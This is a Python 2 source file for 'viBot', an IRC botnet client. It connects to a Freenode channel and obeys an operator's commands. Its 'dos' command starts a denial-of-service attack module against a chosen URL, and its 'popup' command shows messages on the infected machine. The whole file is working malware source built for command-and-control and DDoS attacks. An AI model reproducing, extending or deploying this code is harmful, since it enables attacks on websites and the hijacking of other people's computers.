#!/usr/bin/env python
#-*- coding: utf-8 -*-
#
#

__author__  = "Black Viking"
__version__ = "v0.0.1"

__date__    = "20.06.2017"
__mail__    = "blackvkng@yandex.com"

import os
import sys
import random
import socket
import getpass
import threading

from modules import popup
from modules import hammer

SERVER = "chat.freenode.net"
TARGET = None
CHNL   = "#viBotChannel"
PORT   = "6667"
BASE   = "blackvkng"
NICK   = "viBot" + getpass.getuser() + str(random.randrange(1, 999))

IRC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

IRC.connect((SERVER, int(PORT)))

def send(text):
	''' Send data to IRC channel / user '''

	IRC.send(text+"\n\r")

def login():
	''' Login to IRC channel '''

	send("USER " + ' '.join([NICK for i in range(4)]))
	send("NICK " + NICK)
	send("JOIN " + CHNL)

def recv():
	''' Receive data from IRC channel / user '''

	while True:
		msg = IRC.recv(4096)

def startDos(url):
	''' Start dos module(hammer) in new thread '''
	
	thread = threading.Thread(target=hammer.run, args=(url, ))
	thread.daemon = True
	thread.start()

def popupMessage(message):
	''' Start popup message module in new thread '''

	thread = threading.Thread(target=popup.run, args=(message, ))
	thread.daemon = True
	thread.start()


def run(msg, priv=False):
	''' Try to run received text '''

	global TARGET

	message  = msg.split(" ")
	receiver = BASE if priv == True else CHNL

	if message[0] == "dos":
		if ' '.join(message[1:3]) == "set target":

			TARGET = message[-1]
			send("PRIVMSG %s :%s"%(receiver, "[*] Target: "+TARGET))

		elif message[-1] == "start":
			if TARGET != None:
				startDos(TARGET)
				send("PRIVMSG %s :%s"%(receiver, "[+] Attack started, Target: "+TARGET))
			
			else:
				pass
					
		else:
			usage  = "[?] Dos module usage: dos set target www.google.com"
			usage2 = "[?] Dos module usage: dos start"
			
			for i in [usage, usage2]:
				send("PRIVMSG %s :%s"%(receiver, i))

	elif message[0] == "popup":
		if len(message) > 1:
			content = ' '.join(message[1:])
			popupMessage(content)
		else:
			usage = "[?] Popup module usage: popup TEXT"
			send("PRIVMSG %s :%s"%(receiver, usage))
		

	else:
		pass

def main():
	''' Main function '''

	while True:
		msg = IRC.recv(4096)
		msg = msg.split()

		if msg[0] == "PING":
			send("PONG " + msg[1])

		elif BASE in msg[0] and msg[2] == CHNL:
			msg = ' '.join(msg[3:])[1:].lower()
			print BASE + " - " + CHNL + " -> " + msg
			
			run(msg)


		elif BASE in msg[0] and msg[2] == NICK:
			msg = ' '.join(msg[3:])[1:].lower()
			print BASE + " - " + NICK + " -> " + msg

			run(msg, True)
			

if __name__ == "__main__":
	login()
	main()
